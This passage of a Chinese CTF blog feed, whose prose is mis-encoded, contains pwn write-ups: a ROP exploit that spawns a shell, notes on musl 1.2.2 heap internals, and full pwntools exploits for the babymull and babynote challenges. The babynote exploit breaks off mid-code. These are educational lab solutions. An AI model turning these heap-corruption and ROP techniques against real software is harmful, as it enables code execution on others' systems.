/><p>è€Œåœ¨ä¸´è¿‘rbpçš„éƒ¨åˆ†å­˜ç€å¤åˆ¶è¿‡ç¨‹ä¸­å¾ªç¯çš„å¤§å°ä¸æ ˆçš„ç›¸å¯¹åŸºå€ï¼Œå¦‚æœç›´æ¥å¡«å……æ•°æ®æº¢å‡ºçš„æ•°æ®å°†å…¶æ”¹å˜å°±ä¼šä½¿å¤åˆ¶æ•°æ®å¤±è´¥ï¼Œä¸èƒ½è¦†ç›–è¿”å›åœ°å€äº†ï¼Œè¿™é‡Œä½¿ç”¨â€+â€è¿™ä¸ªå­—ç¬¦å¯ä»¥ä¸å¯¹è®©æ•°æ®ä¸å¤åˆ¶åˆ°æ ˆä¸Šï¼Œè€Œå¾ªç¯çš„å¤§å°ä¾ç„¶å†å¢åŠ ï¼š</p><img src="/img/13/Screenshot 2023-05-30 201330.png" style="zoom: 50%;" /><p>â€‹</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x444fec</span><br>pop_rsi_ret = <span class="hljs-number">0x41e818</span><br>pop_rdx_ret = <span class="hljs-number">0x49e11d</span><br>pop_rax_ret = <span class="hljs-number">0x40d9e6</span><br>syscall_ret = <span class="hljs-number">0x4636e9</span><br>bss = <span class="hljs-number">0x5A2C88</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;cert nAcDsMicN S33UAga1n@#!&#x27;</span>)<br><br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(<span class="hljs-number">8</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>payload += p64(pop_rdi_ret) + p64(bss) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0x3b</span>) + p64(syscall_ret)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;#&#x27;</span>, <span class="hljs-string">b&#x27;echo &#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x200</span> - <span class="hljs-number">0x100</span> - <span class="hljs-number">0xd</span>) + <span class="hljs-string">b&#x27; &#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x110</span> + <span class="hljs-string">b&#x27;+&#x27;</span> * <span class="hljs-number">0x20</span> + payload)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>musl 1.2.2çš„ä¸¤é“pwné¢˜</title>
    <link href="/2023/04/04/musl-pwn/"/>
    <url>/2023/04/04/musl-pwn/</url>
    
    <content type="html"><![CDATA[<p>musl 1.2.2å †çš„å†…å­˜ç®¡ç†ä¸ä»¥å‰å­¦çš„glibcå®Œå…¨ä¸åŒï¼Œæ˜¯å°†ä¸€å—è¿ç»­çš„å†…å­˜åˆ’åˆ†ä¸ºç›¸åŒçš„å¤§å°çš„chunkï¼ˆæœ‰ç‚¹åƒslabï¼‰ï¼Œå†å»ç”±groupã€metaã€malloc_contextè¿™äº›ç»“æ„ä½“é€çº§å»ç®¡ç†ï¼Œæ¨èå¤§å®¶å¤šçœ‹å‡ é0xRGzå¸ˆå‚…çš„muslæºç è§£æ<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">æ–‡ç« </a>ï¼Œè¿™é‡Œä¸»è¦å†™çš„æ˜¯è‡ªå·±åœ¨å¤ç°musl pwné¢˜ä¸­æ‰€å­¦åˆ°çš„ä¸€äº›ç»†èŠ‚ã€‚</p><p>â€‹                                                     </p><h3 id="å‰ç½®è¦ç‚¹"><a href="#å‰ç½®è¦ç‚¹" class="headerlink" title="å‰ç½®è¦ç‚¹"></a>å‰ç½®è¦ç‚¹</h3><h4 id="åˆ†é…ç­–ç•¥"><a href="#åˆ†é…ç­–ç•¥" class="headerlink" title="åˆ†é…ç­–ç•¥"></a>åˆ†é…ç­–ç•¥</h4><p>éœ€è¦è®°ä½çš„æ˜¯<strong>åˆšé‡Šæ”¾çš„chunkä¸ä¼šè¢«ç«‹åˆ»ä½¿ç”¨</strong>ï¼š</p><ul><li>åœ¨åŒä¸€çš„groupä¸­ï¼Œå¦‚æœavail_maskä¸ä¸º0ï¼Œå¦‚æœé‡Šæ”¾ä¸€ä¸ªè¯¥groupä¸­çš„chunkï¼Œæ¥ä¸‹æ¥ç”³è¯·chunkä¹Ÿåªä¼šä¼˜å…ˆç”³è¯·é‚£äº›è¢«avail_maskæ ‡è¯†çš„ï¼Œè€Œä¸ä¼šå»ä½¿ç”¨åˆšé‡Šæ”¾çš„ï¼›</li><li>å¦‚æœavail_mask ä¸º0ï¼Œå°±ä¼šå»æ‰¾meta-&gt;nextæ‰€æŒ‡å‘çš„metaï¼Œè°ƒç”¨activate_groupå‡½æ•°æ›´æ–°ä¸‹ä¸€ä¸ªmetaçš„avail_maskï¼Œæ¥ç€å»ä½¿ç”¨ä¸‹ä¸€ä¸ªmetaä¸­çš„chunkï¼ŒåŒæ—¶å°†ä¸‹ä¸€ä¸ªmetaæ›´æ–°ä¸ºé“¾è¡¨å¤´ã€‚</li></ul><p>â€‹                                                                      </p><h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>        m-&gt;prev-&gt;next = m-&gt;next;<br>        m-&gt;next-&gt;prev = m-&gt;prev;<br>        <span class="hljs-keyword">if</span> (*phead == m) *phead = m-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        *phead = <span class="hljs-number">0</span>;<br>    &#125;<br>    m-&gt;prev = m-&gt;next = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>dequeue</strong> è§¦å‘æ¡ä»¶ï¼š</p><ul><li><p>avail_mask è¡¨ç¤ºåªæœ‰ä¸€ä¸ªchunk è¢«ä½¿ç”¨ ï¼Œfreed_mask &#x3D; 0ï¼Œè€Œfreeåˆšå¥½è¦free ä¸€ä¸ªchunkï¼›</p></li><li><p>avail_mask &#x3D; 0, freed_maskè¡¨ç¤ºåªæœ‰1ä¸ª chunkæ²¡è¢«é‡Šæ”¾ï¼Œè¿™æ—¶é‡Šæ”¾çš„chunkå°±æ˜¯æœ€åä¸€ä¸ªchunkï¼›</p></li><li><p>avail_mask &#x3D; 0, freed_mask &#x3D; 0ï¼Œä¸”ç»§ç»­ç”³è¯·è¯¥å¤§å°çš„chunkï¼Œè¿™æ—¶å°±ä¼šunlinkæ­¤metaï¼Œä½¿ç”¨æ–°çš„metaåˆ†é…ã€‚</p></li></ul><p>â€‹                                                               </p><h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">queue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>assert(!m-&gt;next);<br>assert(!m-&gt;prev);<br><span class="hljs-keyword">if</span> (*phead) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">head</span> =</span> *phead;<br>m-&gt;next = head;<br>m-&gt;prev = head-&gt;prev;<br>m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;prev = m-&gt;next = m;<br>*phead = m;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>queue</strong> è§¦å‘æ¡ä»¶ï¼š</p><p>avail_mask &#x3D; 0ï¼Œ freed_mask &#x3D; 0ï¼Œé‡Šæ”¾å…¶ä¸­çš„ä¸€ä¸ªchunkï¼ˆå½“ç„¶è¯¥metaå·²ç»æ˜¯dequeueçš„ï¼‰ã€‚</p><p>â€‹                                                                          </p><h3 id="ç¥¥äº‘æ¯2021-babymull"><a href="#ç¥¥äº‘æ¯2021-babymull" class="headerlink" title="ç¥¥äº‘æ¯2021 babymull"></a>ç¥¥äº‘æ¯2021 babymull</h3><p>è¿™é‡Œæ˜¯ç›´æ¥å‚è€ƒçš„è¿™ç¯‡<a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">wp</a>ã€‚</p><p>æœ€ä¸»è¦çš„å°±æ˜¯é€šè¿‡åé—¨å‡½æ•°å»æ³„æ¼malloc_contextçš„secretï¼Œä¿®æ”¹chunkçš„offsetï¼Œè®©å…¶æ‰¾åˆ°ä¼ªé€ çš„groupï¼Œå†é€šè¿‡ä¼ªé€ çš„groupæ‰¾åˆ°ä¼ªé€ çš„metaï¼Œqueueä¼ªé€ çš„metaï¼Œæœ€åä¿®æ”¹ä¼ªé€ çš„meta-&gt;memåœ°å€ï¼Œå®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>â€‹</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babymull&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babymull&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, name = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">set_null, leak</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x73317331</span>).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(set_null).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(leak).encode())<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x238</span> + p32(<span class="hljs-number">5</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">5</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak + <span class="hljs-number">0x2aa0</span><br><br>mmap_addr = libc_base - <span class="hljs-number">0x4000</span><br>stdin = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdin_FILE&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdout_FILE&#x27;</span>]<br>malloc_context = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_context&#x27;</span>]<br>gadget = libc_base + <span class="hljs-number">0x4bcf3</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x15536</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x1b3a9</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x177c7</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>gift(leak - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, malloc_context)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>fake_meta = mmap_addr + <span class="hljs-number">0x1000</span> + <span class="hljs-number">8</span><br>fake_group = mmap_addr + <span class="hljs-number">0x550</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x520</span> + p64(fake_meta)<br>payload = payload.ljust(<span class="hljs-number">0xfd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(secret)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_group)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xfc0</span> + p64(secret) + p64(mmap_addr + <span class="hljs-number">0x1008</span>) * <span class="hljs-number">2</span> + p64(stdout - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">3</span>) + p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>libc.address = libc_base<br>payload = flat([<br>    pop_rdi_ret, mmap_addr + <span class="hljs-number">0x2000</span>,<br>    pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>    pop_rdx_ret, <span class="hljs-number">7</span>,<br>    libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>    mmap_addr + <span class="hljs-number">0x2aa0</span> + <span class="hljs-number">0x40</span><br>])<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, mmap_addr, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>, mmap_addr, <span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>) + p64(mmap_addr + <span class="hljs-number">0x2aa0</span>) + p64(ret) + p64(<span class="hljs-number">0</span>) + p64(gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x800</span>).encode())<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>â€‹</p><p>è¿™é‡Œå¼•ç”¨å¦ä¸€ä¸ªå¸ˆå‚…çš„<a href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/">æ–‡ç« </a>å…³äºæ­¤é¢˜çš„ç–‘é—®ï¼Œè‡ªå·±å¤ç°æ—¶ä¹Ÿæœ‰è¿‡åŒæ ·çš„ç–‘é—®</p><img src="/img/12/Screenshot 2023-04-04 221257.png" style="zoom: 67%;" /><p>â€‹                                                            </p><p>ç–‘é—®1ï¼š<strong>å¯ä»¥ç›´æ¥ç”³è¯·åˆ°stdout_FILEæ˜¯å› ä¸ºavail_maskè®¾ç½®ä¸º2ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯ç¬¬ä¸€ä¸ªchunkå·²ç»è¢«æ ‡è¯†ä¸ºä¸å¯åˆ†é…ï¼Œç¬¬äºŒä¸ªchunkåˆ™æ˜¯å¯ä»¥åˆ†é…ï¼Œæ‰€ä»¥å°±ç›´æ¥è¶Šè¿‡ä¸­é—´0x940ï¼Œåˆ†é…ç¬¬äºŒä¸ªchunkï¼›å¦‚æœavail_maskè®¾ç½®ä¸º3æˆ–è€…1ï¼Œåˆ™å°±å¯ä»¥æ­£å¸¸ä»å¤´å¼€å§‹åˆ†é…</strong>ã€‚</p><p>ç–‘é—®2ï¼š<strong>æ˜¯ç»•è¿‡freeçš„æ£€æŸ¥ï¼Œæ›´è¯¦ç»†ç‚¹å°±æ˜¯get_nominal_sizeå‡½æ•°ä¸­å…³äºchunkè¾¹ç•Œçš„æ£€æŸ¥</strong></p><img src="/img/12/Screenshot 2023-04-04 225810.jpg" style="zoom: 80%;" /><p>â€‹                                                                   </p><h3 id="CTF2022-babynote"><a href="#CTF2022-babynote" class="headerlink" title="*CTF2022 babynote"></a>*CTF2022 babynote</h3><p>è¿™é‡Œæ˜¯å‚è€ƒxyzmpvå¸ˆå‚…çš„<a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">wp</a></p><p>å…·ä½“ç»†èŠ‚å°±ä¸å†èµ˜è¿°ï¼Œéœ€è¦æ³¨æ„åœ¨callocå‡½æ•°ä¸­ä½¿ç”¨mallocåˆ†é…å†…å­˜åä¼šç»§ç»­è°ƒç”¨is_allzeroå‡½æ•°ï¼Œè€Œåœ¨is_allzeroå‡½æ•°ä¸­åˆå­˜åœ¨get_metaå‡½æ•°å»æ£€æŸ¥æ‰€åˆ†é…çš„å†…å­˜å—ï¼Œéœ€è¦å…ˆdequeueå»å°†ç›®æ ‡å†…å­˜çš„groupæ”¹ä¸ºæ­£ç¡®çš„å†…å­˜åœ°å€ï¼Œä¹‹åæ‰èƒ½æ­£å¸¸åˆ†é…ç›®æ ‡åœ°å€ã€‚</p><p>â€‹                </p><p>åˆ©ç”¨dequeueå»æ”»å‡»ï¼Œé™¤äº†ä¼ªé€ prev,ã€nextã€avail_maskã€ freed_maskè¿™äº›å€¼ï¼Œ<strong>freeableå’Œmaplenä¹Ÿä¸èƒ½å¿½è§†</strong>ã€‚</p><p>åªæœ‰freeable &#x3D; 1æ—¶ï¼Œmetaæ‰èƒ½è¢«dequeueã€‚</p><p>å½“maplen &#x3D; 0æ—¶ï¼Œè¯´æ˜groupä¸æ˜¯æ–°mmap å‡ºæ¥çš„ï¼Œè€Œæ˜¯ä½¿ç”¨å…¶ä»–metaé‡Œçš„groupï¼›ä½¿ç”¨æœ€ç®€å•çš„ä»£ç å°±èƒ½è¯æ˜è¿™ä¸€ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨malloc(0x20)ä¹‹å‰æ˜¯æ²¡æœ‰ç›¸åº”0x30å¤§å°çš„group</p><img src="/img/12/Screenshot 2023-04-05 120207.png" style="zoom: 67%;" /><p>â€‹</p><p>åœ¨mallocåå¯ä»¥è§‚å¯Ÿåˆ°active[2]çš„groupå®é™…ä¸Šæ˜¯ç›´æ¥ä»active[15]ä¸­åˆ†é…çš„chunk</p><img src="/img/12/Screenshot 2023-04-05 120251.jpg" style="zoom:67%;" /><p>è€Œåœ¨åˆ©ç”¨dequeueå»æ”»å‡»æ—¶ï¼Œå¦‚æœè®¾ç½®maplenä¸º0ï¼Œåœ¨dequeueä¹‹åå°±ä¼šè°ƒç”¨free_groupå‡½æ•°ï¼Œç„¶åå°±ä½¿ç”¨get_metaå¯¹ä¼ªé€ çš„groupè¿˜è¦åšä¸€ç³»åˆ—æ£€æŸ¥ï¼Œæœ€åå†å»è°ƒç”¨nontrivial_freeå‡½æ•°ï¼Œè¿™å°±å¯¹ä¼ªé€ çš„groupå’Œmetaæœ‰æ›´å¤šçš„è¦æ±‚ï¼Œå¼•èµ·ä¸å¿…è¦çš„éº»çƒ¦ã€‚</p><img src="/img/12/Screenshot 2023-04-04 232505.jpg" style="zoom: 80%;" /><p>â€‹</p><p>ç”±äºè‡ªå·±æœ¬åœ°ä½¿ç”¨çš„æ˜¯musl_1.2.2-4ï¼Œå¯¹è¿™é“é¢˜ç»™çš„libcæ— æ³•æ­£å¸¸ä½¿ç”¨å¸¦ç¬¦å·è°ƒè¯•(ä¹Ÿä¸ç¡®å®šæ˜¯ä¸æ˜¯è¿™ä¸ªåŸå› å¯¼è‡´çš„)ï¼Œä¸ºäº†æ–¹ä¾¿è‡ªå·±åšé¢˜å°±ç›´æ¥æ‹¿æœ¬åœ°çš„libcå»åšäº†ï¼Œä¸‹é¢expä»…ä¾›å‚è€ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babynote&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babynote&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size0, content0, size1, 